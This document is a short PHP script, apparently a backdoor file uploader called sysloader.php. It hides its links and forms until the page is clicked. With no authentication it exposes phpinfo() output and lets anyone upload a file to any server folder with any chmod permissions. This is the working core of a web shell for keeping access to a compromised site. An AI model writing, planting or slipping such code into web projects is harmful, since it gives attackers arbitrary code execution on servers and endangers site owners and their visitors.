<?php
if (isset($_REQUEST['action'])) {$action=$_REQUEST['action'];} else {$action='';}
switch($action) {
	case "info":
		echo "<p><a href='sysloader.php?display=true'>To the main page</a></p>";
		phpinfo();
		break;
	case "showupload":
		echo "<p><a href='sysloader.php?display=true'>To the main page</a></p>";
		?>
		<script>
		function ShowForm() {
			document.getElementById('UploadForm').style.display='block';
		}
		</script>
		<?php
		echo "<body onClick='ShowForm();'>";
		echo "<form id='UploadForm' style='display: none' method='post' enctype='multipart/form-data'>";
		echo "<p><input type='text' name='chmod' value='' placeholder='access'>";
		echo "<p><input type='text' name='folder' value='' placeholder='folder'>";
		echo "<p><input type='file' name='filename'>";
		echo "<input type='hidden' name='action' value='upload'>";
		echo "<p><input type='submit' value='Ok'>";
		echo "</form>";
		echo "</body>";
		break;
	case "upload":
		echo "<p><a href='sysloader.php?display=true'>To the main page</a></p>";
		if (isset($_REQUEST['folder'])) {$folder=$_REQUEST['folder'];} else {$folder='';}
		if (isset($_REQUEST['chmod'])) {$chmod=$_REQUEST['chmod'];} else {$chmod='';}
		if(is_uploaded_file($_FILES["filename"]["tmp_name"])) {
			if ($folder=='') {$folder=dirname(__FILE__).'/';}
			move_uploaded_file($_FILES["filename"]["tmp_name"], $folder.$_FILES["filename"]["name"]);
			if ($chmod!='') {chmod($folder.$_FILES["filename"]["name"],$chmod);}
			echo "Successfull";
		} else {echo("Uploading error");}
		break;
	default:
		if (isset($_REQUEST['display'])) {$display=$_REQUEST['display'];} else {$display='';}
		?>
		<script>
		function ShowForm() {
			document.getElementById('indexForm').style.display='block';
		}
		</script>
		<body onClick='ShowForm();'>
		<?php
		if ($display=='true') {echo "<div id='indexForm'>";} else {echo "<div id='indexForm' style='display: none'>";}
		?>
			<p><a href='?action=info'>Info</a>
			<p><a href='?action=showupload'>ShowUpload</a>
		</div>
		</body>
		<?php
		break;
}


?>